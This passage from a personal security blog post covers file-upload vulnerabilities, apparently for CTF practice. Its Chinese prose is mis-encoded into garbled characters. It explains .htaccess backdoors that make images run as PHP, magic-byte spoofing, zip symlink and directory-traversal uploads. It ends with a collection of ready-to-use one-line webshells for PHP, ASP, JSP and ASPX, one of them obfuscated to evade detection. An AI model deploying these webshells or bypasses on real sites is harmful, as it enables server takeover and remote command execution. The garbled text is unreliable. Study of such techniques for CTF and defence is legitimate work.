<li>åœ¨å­˜åœ¨åŒæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„é¡µé¢ä¸­ï¼ŒæŸ¥çœ‹ä¸Šä¼ çš„é¡µé¢ã€‚F12æ‰¾åˆ°ä¸Šä¼ çš„postè¡¨å•ï¼Œactionå±æ€§æ˜¯æŒ‡å®šä¸Šä¼ æ£€æµ‹é¡µé¢ï¼Œä¸€èˆ¬æ˜¯å†™çš„ç»å¯¹è·¯å¾„ï¼Œæ¯”å¦‚ï¼š<code>xxx.asp/xxx.php</code></li>
<li>è¡¥å…¨urlï¼š<code>https://www.xxx.com/xxx.php(asp)</code></li>
<li>æ„é€ æœ¬åœ°postæäº¤è¡¨å•</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;https://www.xxx.com/xxx.asp(php)&quot; method=&quot;post&quot;</span><br><span class="line">name=&quot;form1&quot; enctype=&quot;multipart/formâ€data&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName1&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName2&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;ä¸Šä¼ &quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨æ—¶åªéœ€è¦ä¿®æ”¹actionçš„å€¼ä¸ºæŒ‡å®šä¸Šä¼ é¡µé¢å³å¯</p>
<ul>
<li>ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ å…è®¸çš„æ–‡ä»¶ç±»å‹ï¼ˆ<code>.jpg</code> <code>.png</code> <code>.gif</code> ç­‰ï¼‰ï¼Œç¬¬äºŒä¸ªä¸Šä¼ æ–‡ä»¶æ˜¯ä¸€å¥è¯æœ¨é©¬æˆ–è€…WebShellè„šæœ¬ã€‚è¿™æ ·å°±å¯ä»¥çªç ´ä¸Šä¼ é™åˆ¶ï¼ŒæˆåŠŸä¸Šä¼ æœ¨é©¬åˆ°æœåŠ¡å™¨ã€‚</li>
</ul>
</blockquote>
<h3 id="php3457"><a href="#php3457" class="headerlink" title="php3457 #"></a>php3457 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#php3457">#</a></h3><blockquote>
<p>è¯¥é¡¹ä¸ºapacheä¸“å±ã€‚å…³é”®ç‚¹åœ¨<code>/etc/apache2/mods-available/php5.6.conf</code>è¿™ä¸ªæ–‡ä»¶ï¼Œæ»¡è¶³<code>.+\.ph(p[3457]?|t|tml)$</code>ï¼Œéƒ½ä¼šè¢«å½“ä½œphpæ–‡ä»¶è§£æã€‚</p>
<p>åœ¨apache2ç›®å½•ä¸‹<code>grep -r x-httpd-php /etc/apache2</code>æ‰¾åˆ°å¯¹åº”æ–‡ä»¶å°±èƒ½çŸ¥é“è§£æå“ªäº›åç¼€ã€‚</p>
</blockquote>
<h3 id="htaccessæ–‡ä»¶æ”»å‡»"><a href="#htaccessæ–‡ä»¶æ”»å‡»" class="headerlink" title=".htaccessæ–‡ä»¶æ”»å‡» #"></a>.htaccessæ–‡ä»¶æ”»å‡» <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#htaccess%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB">#</a></h3><blockquote>
<p>.htaccessæ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚</p>
<p>æ¦‚è¿°æ¥è¯´ï¼Œhtaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p>
<p>å¯ç”¨.htaccessï¼Œéœ€è¦ä¿®æ”¹httpd.confï¼Œå¯ç”¨AllowOverrideï¼Œå¹¶å¯ä»¥ç”¨AllowOverrideé™åˆ¶ç‰¹å®šå‘½ä»¤çš„ä½¿ç”¨ã€‚å¦‚æœéœ€è¦ä½¿ç”¨.htaccessä»¥å¤–çš„å…¶ä»–æ–‡ä»¶åï¼Œå¯ä»¥ç”¨AccessFileNameæŒ‡ä»¤æ¥æ”¹å˜ã€‚ä¾‹å¦‚ï¼Œéœ€è¦ä½¿ç”¨.config ï¼Œåˆ™å¯ä»¥åœ¨æœåŠ¡å™¨é…ç½®æ–‡ä»¶ä¸­æŒ‰ä»¥ä¸‹æ–¹æ³•é…ç½®ï¼šAccessFileName .config ã€‚</p>
<p>ç¬¼ç»Ÿåœ°è¯´ï¼Œ.htaccesså¯ä»¥å¸®æˆ‘ä»¬å®ç°åŒ…æ‹¬ï¼šæ–‡ä»¶å¤¹å¯†ç ä¿æŠ¤ã€ç”¨æˆ·è‡ªåŠ¨é‡å®šå‘ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€æ”¹å˜ä½ çš„æ–‡ä»¶æ‰©å±•åã€å°ç¦ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€åªå…è®¸ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸ºindexæ–‡ä»¶ç­‰ä¸€äº›åŠŸèƒ½ã€‚</p>
</blockquote>
<p>ä¸€èˆ¬<code>.htaccess</code>å¯ä»¥ç”¨æ¥ç•™åé—¨å’Œé’ˆå¯¹é»‘åå•ç»•è¿‡ã€‚åœ¨ä¸Šä¼ ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ª<code>.htaccess</code>æ–‡ä»¶å³å¯ã€‚</p>
<p>ç»•è¿‡æ–¹æ³•ï¼š</p>
<blockquote>
<ul>
<li>é’ˆå¯¹é»‘åå•ç»•è¿‡</li>
</ul>
<p>åˆ›å»ºä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå†™å…¥</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType  application/x-httpd-php    .png</span><br></pre></td></tr></table></figure>



<p>å¦å­˜ä¸º <code>.htaccess</code> åç§°ï¼Œä¿å­˜ç±»å‹ä¸ºæ‰€æœ‰æ–‡ä»¶ï¼Œå³å¯å°†<code>png</code>æ–‡ä»¶è§£æä¸º<code>php</code>æ–‡ä»¶ã€‚</p>
<ul>
<li>ç•™åé—¨</li>
</ul>
<p>åœ¨<code>.htaccess</code> å†…å†™å…¥<code>php</code>è§£æè§„åˆ™ï¼Œç±»ä¼¼äºæŠŠæ–‡ä»¶ååŒ…å«<code>s</code>çš„è§£ææˆ<code>php</code>æ–‡ä»¶</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;s&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>



<p><code>shell.png</code> å°±ä¼šä»¥<code>php</code>æ–‡ä»¶æ‰§è¡Œ</p>
<ul>
<li>åˆ©ç”¨.htaccessè¿›è¡Œæ–‡ä»¶åŒ…å«</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php eval($_POST[cmd]);?&gt;</span><br></pre></td></tr></table></figure>



<ul>
<li>ä½¿ç”¨#æ³¨é‡Šä½¿å¾—.htaccessèƒ½å¤ŸæˆåŠŸè§£æ</li>
</ul>
</blockquote>
<h3 id="æœåŠ¡å™¨æ£€æµ‹ï¼ˆæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼‰"><a href="#æœåŠ¡å™¨æ£€æµ‹ï¼ˆæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼‰" class="headerlink" title="æœåŠ¡å™¨æ£€æµ‹ï¼ˆæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼‰ #"></a>æœåŠ¡å™¨æ£€æµ‹ï¼ˆæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼‰ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A3%80%E6%B5%8B-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B">#</a></h3><h4 id="æ–‡ä»¶å¹»æ•°æ£€æµ‹ï¼ˆæ–‡ä»¶å¼€å¤´ï¼‰"><a href="#æ–‡ä»¶å¹»æ•°æ£€æµ‹ï¼ˆæ–‡ä»¶å¼€å¤´ï¼‰" class="headerlink" title="æ–‡ä»¶å¹»æ•°æ£€æµ‹ï¼ˆæ–‡ä»¶å¼€å¤´ï¼‰ #"></a>æ–‡ä»¶å¹»æ•°æ£€æµ‹ï¼ˆæ–‡ä»¶å¼€å¤´ï¼‰ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E5%B9%BB%E6%95%B0%E6%A3%80%E6%B5%8B-%E6%96%87%E4%BB%B6%E5%BC%80%E5%A4%B4">#</a></h4><blockquote>
<p>å¹»æ•° magic numberï¼Œå®ƒå¯ä»¥ç”¨æ¥æ ‡è®°æ–‡ä»¶æˆ–è€…åè®®çš„æ ¼å¼ï¼Œå¾ˆå¤šæ–‡ä»¶éƒ½æœ‰å¹»æ•°æ ‡å¿—æ¥è¡¨æ˜è¯¥æ–‡ä»¶çš„æ ¼å¼ã€‚</p>
</blockquote>
<p>è¦ç»•è¿‡æ–‡ä»¶å¹»æ•°æ£€æµ‹å°±è¦åœ¨æ–‡ä»¶å¼€å¤´å†™ä¸Šå¦‚ä¸‹çš„å€¼</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.jpg	FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">.gif	47 49 46 38 39 61</span><br><span class="line">.png	89 50 4E 47</span><br></pre></td></tr></table></figure>



<p>åœ¨æ–‡ä»¶å¹»æ•°åé¢åŠ ä¸Šè‡ªå·±çš„WebShellä»£ç å°±è¡Œ</p>
<h4 id="æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹"><a href="#æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹" class="headerlink" title="æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹ #"></a>æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%A3%80%E6%B5%8B">#</a></h4><p>å›¾åƒæ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹å¸¸ç”¨çš„æ˜¯getimagesize()å‡½æ•°ï¼Œéœ€è¦æŠŠæ–‡ä»¶å¤´éƒ¨åˆ†ä¼ªé€ ï¼Œä¹Ÿå°±æ˜¯åœ¨å¹»æ•°çš„åŸºç¡€ä¸Šè¿˜åŠ äº†ä¸€äº›æ–‡ä»¶ä¿¡æ¯ã€‚</p>
<blockquote>
<ul>
<li>ä¾‹å¦‚ä¸‹é¢ç»“æ„</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure>


</blockquote>
<p>å¦ä¸€ç§æ˜¯åˆ¤æ–­æ˜¯å¦åŒ…å«<code>&lt;?</code>æˆ–è€…<code>php</code></p>
<blockquote>
<ul>
<li><p>ç»•è¿‡<code>&lt;?</code>ï¼š</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>


</li>
<li><p>ç»•è¿‡<code>php</code>ï¼š</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</blockquote>
<p>ç»•è¿‡æ–¹æ³•ï¼š</p>
<blockquote>
<ul>
<li>å¯¹æ¸²æŸ“&#x2F;åŠ è½½æµ‹è¯•çš„æ”»å‡»æ–¹å¼æ˜¯ä»£ç æ³¨å…¥ç»•è¿‡ã€‚ä½¿ç”¨winhexåœ¨ä¸ç ´åæ–‡ä»¶æœ¬èº«çš„æ¸²æŸ“æƒ…å†µä¸‹æ‰¾ä¸€ä¸ªç©ºç™½åŒºè¿›è¡Œå¡«å……ä»£ç ï¼Œä¸€èˆ¬ä¸ºå›¾ç‰‡çš„æ³¨é‡ŠåŒºã€‚</li>
<li>å¯¹äºŒæ¬¡æ¸²æŸ“çš„æ”»å‡»æ–¹å¼å°±æ˜¯æ”»å‡»æ–‡ä»¶åŠ è½½å™¨è‡ªèº«ã€‚ä¾‹å¦‚ï¼š</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä¸Šä¼ æ–‡ä»¶æ•°æ®ä¸å®Œæ•´çš„gifæ–‡ä»¶ -&gt; è§¦å‘æŠ¥é”™imagecreatefromgif()å‡½æ•°</span><br><span class="line">ä¸Šä¼ æ–‡ä»¶æ•°æ®ä¸å®Œæ•´çš„pngæ–‡ä»¶ -&gt; è§¦å‘æŠ¥é”™imagecreatefrompng()å‡½æ•°</span><br></pre></td></tr></table></figure>



<p>æŸåå°è°ƒç”¨GDåº“å¯¹å›¾åƒè¿›è¡ŒäºŒæ¬¡æ¸²æŸ“çš„ä»£ç </p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function image_gd_open($file, $extension)</span><br><span class="line">&#123;</span><br><span class="line">$extension = str_replace(&#x27;jpg&#x27;, &#x27;jpeg&#x27;, $extension);</span><br><span class="line">$open_func = &#x27;imageCreateFrom&#x27;. $extension; //å‡½æ•°åå˜æˆimageCreateFrompng ä¹‹ç±»</span><br><span class="line">if (!function_exists($open_func))</span><br><span class="line">&#123;</span><br><span class="line">	return FALSE;</span><br><span class="line">&#125;</span><br><span class="line">return $open_func($file); //å˜æˆimagecreatefrompng(&#x27;/tmp/phpimage&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>å¯¹æ–‡ä»¶åŠ è½½å™¨è¿›è¡Œæ”»å‡»ï¼Œå¸¸è§çš„å°±æ˜¯æº¢å‡ºæ”»å‡»ã€‚ä¸Šä¼ è‡ªå·±çš„æ¶æ„æ–‡ä»¶åï¼ŒæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶åŠ è½½å™¨ä¼šä¸»åŠ¨è¿›è¡ŒåŠ è½½æµ‹è¯•ï¼ŒåŠ è½½æµ‹è¯•æ—¶è¢«æº¢å‡ºæ”»å‡»æ‰§è¡Œshellcodeï¼Œæ¯”å¦‚access&#x2F;mdbæº¢å‡ºã€‚</li>
</ul>
</blockquote>
<h3 id="æ–‡ä»¶ä¸Šä¼ ä¸­çš„ç›®å½•ç©¿è¶Šæ¼æ´"><a href="#æ–‡ä»¶ä¸Šä¼ ä¸­çš„ç›®å½•ç©¿è¶Šæ¼æ´" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ä¸­çš„ç›®å½•ç©¿è¶Šæ¼æ´ #"></a>æ–‡ä»¶ä¸Šä¼ ä¸­çš„ç›®å½•ç©¿è¶Šæ¼æ´ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%84%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E">#</a></h3><p>æ”»å‡»æ–¹å¼</p>
<blockquote>
<p>å½¢å¼ï¼šä¸Šä¼ çš„æ–‡ä»¶ä¼šè¢«è§£æä¸ºæ—¥å¿—ä¸èƒ½æ‰§è¡Œï¼Œç»™å‡ºäº†<code>/uploads/xxx.php</code>è·¯å¾„å¹¶ä¸”å¯ä»¥æŸ¥è¯¢</p>
<p>ç»•è¿‡ï¼šä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™æŠ“åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶åï¼ˆfilenameï¼‰ä¸º<code>./../../../../flag</code>ï¼Œä¸Šä¼ æˆåŠŸåè·¯å¾„å˜ä¸º<code>/uploads/./../../../../flag</code>å³å¯è¿›è¡Œç›®å½•ç©¿è¶Š</p>
</blockquote>
<h2 id="æ”»å‡»ä»£ç "><a href="#æ”»å‡»ä»£ç " class="headerlink" title="æ”»å‡»ä»£ç  #"></a>æ”»å‡»ä»£ç  <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81">#</a></h2><h2 id="æ–‡ä»¶å‹ç¼©ï¼š"><a href="#æ–‡ä»¶å‹ç¼©ï¼š" class="headerlink" title="æ–‡ä»¶å‹ç¼©ï¼š"></a>æ–‡ä»¶å‹ç¼©ï¼š</h2><p>è½¯é“¾æ¥å‹ç¼©åŒ…ï¼Œç„¶åä¸Šä¼ åˆ°è½¯é“¾æ¥ä¸‹ï¼Œæ”¾ğŸè¿›è¡Œæ”»å‡»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ln -s /var/www/html web  #åˆ›å»ºè½¯é“¾æ¥æ–‡ä»¶å¤¹</span><br><span class="line">zip -y zip.zip web   #å°†è½¯é“¾æ¥å‹ç¼©ç”Ÿæˆä¸€ä¸ªzip.zip</span><br><span class="line"></span><br><span class="line">å†åœ¨webä¸‹é¢æ”¾ä¸€ä¸ªshell.phpï¼ˆğŸï¼‰ </span><br><span class="line">zip -y z.zip web   #å†ç”Ÿæˆä¸€ä¸ªå¸¦ğŸçš„å‹ç¼©åŒ…</span><br><span class="line"></span><br><span class="line">ç„¶åä¸Šä¼ zip.zipï¼Œå°†ä¸Šä¼ è·¯å¾„æ”¹åˆ°å¯æ§ç›®å½•/var/www/html</span><br><span class="line">ç„¶åä¸Šä¼ z.zipï¼Œå³ä¼ åˆ°äº†ï¼Œæ˜¾ç¤ºçš„ç½‘é¡µä¸‹ï¼ˆvar/www/html/shell.phpï¼‰</span><br><span class="line">èšå‰‘</span><br></pre></td></tr></table></figure>



<h3 id="å¸¸ç”¨æ”»å‡»ä»£ç "><a href="#å¸¸ç”¨æ”»å‡»ä»£ç " class="headerlink" title="å¸¸ç”¨æ”»å‡»ä»£ç  #"></a>å¸¸ç”¨æ”»å‡»ä»£ç  <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E5%B8%B8%E7%94%A8%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81">#</a></h3><blockquote>
<p>ç®€å•çš„ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>



<p>ç»•è¿‡<code>&lt;?</code>é™åˆ¶çš„ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language = &#x27;php&#x27;&gt;@eval($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<p>ç»•è¿‡<code>&lt;?php ?&gt;</code>é™åˆ¶çš„ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= @eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>



<p>aspä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval(Request.Item[&quot;cmd&quot;],â€unsafeâ€);%&gt;</span><br></pre></td></tr></table></figure>



<p>JSPä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt;</span><br></pre></td></tr></table></figure>

<p>JSPä¸€å¥è¯å…æ€ï¼ˆASCLLç¼–ç ï¼‰</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot;  language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    if(request.getParameter(&quot;cmd&quot;)!=null)&#123;</span><br><span class="line">        Class rt = Class.forName(new String(new byte[] &#123; 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 &#125;));</span><br><span class="line">        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null), request.getParameter(&quot;cmd&quot;) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125;out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>ASPXä¸€å¥è¯</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>1</p>
</blockquote>
<h3 id="å…¶å®ƒæ”»å‡»ä»£ç "><a href="#å…¶å®ƒæ”»å‡»ä»£ç " class="headerlink" title="å…¶å®ƒæ”»å‡»ä»£ç  #"></a>å…¶å®ƒæ”»å‡»ä»£ç  <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E5%85%B6%E5%AE%83%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81">#</a></h3><blockquote>
<p>å¼‚æˆ–å–åç­‰æ“ä½œå†™shellçš„phpè„šæœ¬ã€æ··æ·†æœ¨é©¬ã€ä¸æ­»é©¬ã€‚</p>
</blockquote>
<h2 id="æ›´å¤šå‚è€ƒ"><a href="#æ›´å¤šå‚è€ƒ" class="headerlink" title="æ›´å¤šå‚è€ƒ #"></a>æ›´å¤šå‚è€ƒ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9B%B4%E5%A4%9A%E5%8F%82%E8%80%83">#</a></h2><p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-41672-1-1.html?from=sec">https://bbs.ichunqiu.com/thread-41672-1-1.html?from=sec</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/253698.html">https://www.freebuf.com/articles/web/253698.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/179954.html">https://www.freebuf.com/articles/web/179954.html</a></p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>æœ¬æ–‡ä½œè€…ï¼š </strong>chleynx
  </li>
  <li class="post-copyright-link">
    <strong>æœ¬æ–‡é“¾æ¥ï¼š</strong>
    <a href="https://chensonghi.github.io./2023/10/10/file_upload/" title="æ–‡ä»¶ä¸Šä¼ ">https://chensonghi.github.io./2023/10/10/file_upload/</a>
  </li>
  <li class="post-copyright-license">
    <strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/2023-upload/" rel="tag"># 2023 upload</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/10/08/hello-world/" rel="prev" title="Hello World">
      <i class="fa fa-chevron-left"></i> Hello World
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/10/20/SQL%E6%B3%A8%E5%85%A5/" rel="next" title="SQLæ³¨å…¥">
      SQLæ³¨å…¥ <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  




          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
